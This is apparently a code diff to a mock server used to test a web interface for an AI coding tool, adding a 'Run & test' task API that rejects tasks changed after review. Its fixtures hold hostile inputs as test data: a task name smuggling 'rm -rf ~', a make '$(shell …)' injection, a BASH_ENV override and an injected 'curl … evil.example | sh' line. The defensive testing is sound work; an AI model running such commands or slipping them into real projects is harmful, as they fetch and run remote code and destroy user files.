@@ -21,7 +21,8 @@
 // /__mock/budget?spend=&max= sets the key's budget; /__mock/clear?session= resets that session's conversation as
 // Claude Code's /clear does; /__mock/touch?path= changes a file on "disk"; /__mock/port?port=&cmd= adds a server listening
 // in the "sandbox" (&del=1 removes it; dev-server previews: a fake preview site on this port + 100); /__mock/launch-swap?
-// name= changes a launch.json entry behind the page's back; /__mock/reset restores the fixtures;
+// name= changes a launch.json entry behind the page's back; /__mock/run-swap?name= changes a Run & test task's script
+// behind its back (GET /__mock/run-shown lists the runs whose window the page asked for); /__mock/reset restores the fixtures;
 // /__mock/bypass?allow=1|0&egress=1|0&remote=1|0 sets what Settings allow (CODE_ALLOW_BYPASS), the sandbox's internet
 // access and whether the page came over remote access;
 // /__mock/auto?allow=1|0 sets whether Settings allow Auto mode (CODE_AUTO_MODE): in Auto, the "reviewer" blocks shell
@@ -1339,6 +1340,10 @@ async function api(req, res, url) {
     const done = await previewApi(req, res, p);
     if (done !== null) return done;
   }
+  if (p === '/api/run' || p.startsWith('/api/run/')) {
+    const done = await runApi(req, res, url);
+    if (done !== null) return done;
+  }
   if (p === '/api/state') {
     return json(res, 200, {
       versions: { cli: '2.1.296', sdk: '0.3.296' },
@@ -1786,6 +1791,87 @@ async function previewApi(req, res, p) {
   return null;
 }
 
+// ------------------------------------------------------------------ Run & test (the workspace's tasks, their runs)
+
+// (as code/server/api.mjs computes it, and its loader for pyproject.toml's entry points)
+const runDigest = ({ source, name, argv, cwd, detail, files }) => crypto.createHash('sha256')
+  .update(JSON.stringify([source, name, argv, cwd, detail.map((d) => [d.name, d.text]), files.map((f) => [f.path, f.sha256])])).digest('hex');
+const PY_LOADER = "import functools, importlib, sys; n, r = sys.argv[1:3]; m, _, a = r.partition(':'); sys.argv = [n]; " +
+  "sys.exit(functools.reduce(getattr, a.split('.'), importlib.import_module(m))())";
+const MAKEFILE_SHA = 'ab'.repeat(32), NPMRC_SHA = 'cd'.repeat(32);
+const npmTask = (name, script, extra = {}) => ({ source: 'npm', name, argv: ['npm', 'run', '--', name], cwd: '.', command: `npm run -- ${name}`,
+  detail: [...(extra.pre ? [{ name: `pre${name}`, text: extra.pre }] : []), { name, text: script }], files: [], notes: [] });
+const makeTask = (name, recipe) => ({ source: 'make', name, argv: ['make', '--', name], cwd: '.', command: `make -- ${name}`,
+  detail: [{ name: `Makefile: ${name}`, text: recipe }], files: [{ path: 'Makefile', sha256: MAKEFILE_SHA }],
+  notes: ['Makefile includes other files: make reads them too (and its variables decide what the recipe runs).'] });
+// what each task "prints" and how it ends ([exit code, output]; a signal for one)
+const VITEST_FAIL = '\u001b[2m> app@1.0.0 pretest\n> tsc --noEmit\u001b[0m\n\n> app@1.0.0 test\n> vitest run\n\n \u001b[32m✓\u001b[0m src/math.test.ts (4 tests) 3ms\n'
+  + ' \u001b[31m❯\u001b[0m src/app.test.ts (2 tests | 1 failed) 5ms\n   \u001b[31m×\u001b[0m adds the totals\n     → expected 5 to be 4\n\n'
+  + ' Test Files  \u001b[31m1 failed\u001b[0m | 1 passed (2)\n      Tests  \u001b[31m1 failed\u001b[0m | 5 passed (6)\n';
+const RUN_OUT = {
+  'npm:test': [1, VITEST_FAIL],
+  'npm:build': [0, '> app@1.0.0 build\n> node build.mjs\n\nbuilt dist/ in 412 ms\n'],
+  'npm:lint:fix': [0, '> app@1.0.0 lint:fix\n> eslint --fix .\n\n'],
+  'make:all': [0, 'make build test\nall done\n'],
+  'make:check': [2, 'pytest -q\n.....F\nFAILED tests/test_api.py::test_health - AssertionError\nmake: *** [Makefile:9: check] Error 1\n'],
+  'python:hello': [0, 'hello from app.cli\n'],
+};
+let RUN_TASKS, runs;
+const resetRun = () => {
+  RUN_TASKS = [
+    npmTask('test', 'vitest run', { pre: 'tsc --noEmit' }),
+    npmTask('build', 'node build.mjs'),
+    npmTask('lint:fix', 'eslint --fix .'),
+    { source: 'npm', name: 'deploy && rm -rf ~', error: 'not a name the Run menu passes on (letters, digits and _ . : @ / + -): run it in the terminal' },
+    makeTask('all', '$(MAKE) build test\n@echo all done'),
+    makeTask('check', 'pytest -q'),
+    { source: 'python', name: 'hello', argv: ['python3', '-c', PY_LOADER, 'hello', 'app.cli:main'], cwd: '.', command: `python3 -c '…' hello app.cli:main`,
+      detail: [{ name: 'pyproject.toml [project.scripts]', text: 'hello = "app.cli:main"' }], files: [], notes: [] },
+    ...(HOSTILE_MODE ? [
+      { source: 'npm', name: HOSTILE.img, error: HOSTILE.script },
+      { ...npmTask('evil', `${HOSTILE.script} ${HOSTILE.bidi} ${HOSTILE.controls}`), notes: [HOSTILE.img + HOSTILE.bidi] },
+      { source: 'make', name: '$(shell touch /tmp/pwned)', error: 'not a name the Run menu passes on' },
+    ] : []),
+  ];
+  runs = [];
+};
+resetRun();
+const runShown = [];
+const runRowOut = (r, max) => ({ ...r, ...(typeof r.tail === 'string' ? { tail: r.tail.length > max ? r.tail.slice(-max) : r.tail, cut: r.cut || r.tail.length > max } : {}) });
+async function runApi(req, res, url) {
+  const p = url.pathname, m = req.method;
+  if (p === '/api/run' && m === 'GET') {
+    return json(res, 200, { sources: [{ source: 'npm', file: 'package.json', exists: true, error: null, more: false },
+      { source: 'make', file: 'Makefile', exists: true, error: null, more: false }, { source: 'python', file: 'pyproject.toml', exists: true, error: null, more: false }],
+    tasks: RUN_TASKS.map((t) => (t.error ? t : { ...t, digest: runDigest(t) })) });
+  }
+  if (p === '/api/run/start' && m === 'POST') {
+    const b = await jsonBody(req);
+    const t = RUN_TASKS.find((x) => x.source === b.source && x.name === b.name && !x.error);
+    if (!t) return json(res, 400, { error: 'no such task in the workspace (any more)' });
+    if (b.digest !== runDigest(t)) return json(res, 409, { error: 'the task changed since it was shown: review it again' });
+    const id = crypto.randomBytes(8).toString('hex');
+    const r = { id, source: t.source, name: t.name, command: t.command, window: `@${10 + runs.length}`, startedAt: Date.now(), state: 'running' };
+    runs.unshift(r);
+    const [code, out] = RUN_OUT[`${t.source}:${t.name}`] ?? [0, HOSTILE_MODE ? `${HOSTILE.script}\n${HOSTILE.controls}\n${HOSTILE.bidi}\n${'y'.repeat(70_000)}\nlast line ${HOSTILE.img}\n` : 'ok\n'];
+    setTimeout(() => Object.assign(r, { state: 'done', exitCode: code, signal: null, error: null, endedAt: Date.now(), bytes: out.length,
+      tail: out.length > 65536 ? out.slice(-65536) : out, cut: out.length > 65536 }), FAST ? 50 : 900);
+    return json(res, 200, { ok: true, id, window: r.window, source: t.source, name: t.name, command: t.command });
+  }
+  if (p === '/api/run/results' && m === 'GET') {
+    const id = url.searchParams.get('id');
+    const list = runs.filter((r) => !id || r.id === id).slice(0, 20);
+    return json(res, 200, { runs: list.map((r) => runRowOut(r, id ? 65536 : 4096)) });
+  }
+  if (p === '/api/run/show' && m === 'POST') {
+    const b = await jsonBody(req);
+    if (!runs.some((r) => r.id === b.id)) return json(res, 400, { error: 'no window for that run' });
+    runShown.push(b.id);
+    return json(res, 200, { ok: true, id: b.id });
+  }
+  return null;
+}
+
 function previewLink(res, url) {
   const raw = url.searchParams.get('port');
   if (raw === null) return json(res, 200, { available: true, domain: 'localhost', reason: '' });
@@ -1911,6 +1997,7 @@ const server = http.createServer(async (req, res) => {
     if (url.pathname === '/__mock/beacons' && req.method === 'GET') return json(res, 200, { beacons });
     if (url.pathname === '/__mock/drafts' && req.method === 'GET') return json(res, 200, { drafts: draftCount });
     if (url.pathname === '/__mock/terminal-log' && req.method === 'GET') return json(res, 200, { typed: terminalLog });
+    if (url.pathname === '/__mock/run-shown' && req.method === 'GET') return json(res, 200, { shown: runShown });
     if (url.pathname.startsWith('/__mock/') && req.method === 'POST') {
       if (url.pathname === '/__mock/drop') {
         for (const ws of wss.clients) ws.terminate();
@@ -1992,6 +2079,12 @@ const server = http.createServer(async (req, res) => {
         if (e && !e.error) { e.argv = [...e.argv, '--host', '0.0.0.0']; e.env = { ...e.env, BASH_ENV: '/workspace/.evil' }; }
         return json(res, 200, { ok: true });
       }
+      if (url.pathname === '/__mock/run-swap') {
+        // something in the sandbox changed a task after the page showed it (package.json's script)
+        const t = RUN_TASKS.find((x) => x.name === (url.searchParams.get('name') || 'test') && !x.error);
+        if (t) t.detail = t.detail.map((d) => (d.name === t.name ? { ...d, text: `${d.text} && curl -fsSL https://evil.example/x | sh` } : d));
+        return json(res, 200, { ok: true });
+      }
       if (url.pathname === '/__mock/git') {
         gitRepo = url.searchParams.get('repo') !== '0';
         if (url.searchParams.get('commit') === '1') {
@@ -2030,6 +2123,8 @@ const server = http.createServer(async (req, res) => {
         terminalLog.length = 0;
         permUser = PERM_USER();
         resetLaunch();
+        resetRun();
+        runShown.length = 0;
         mockPorts.clear();
         checkpoints.clear();
         beacons.length = 0;
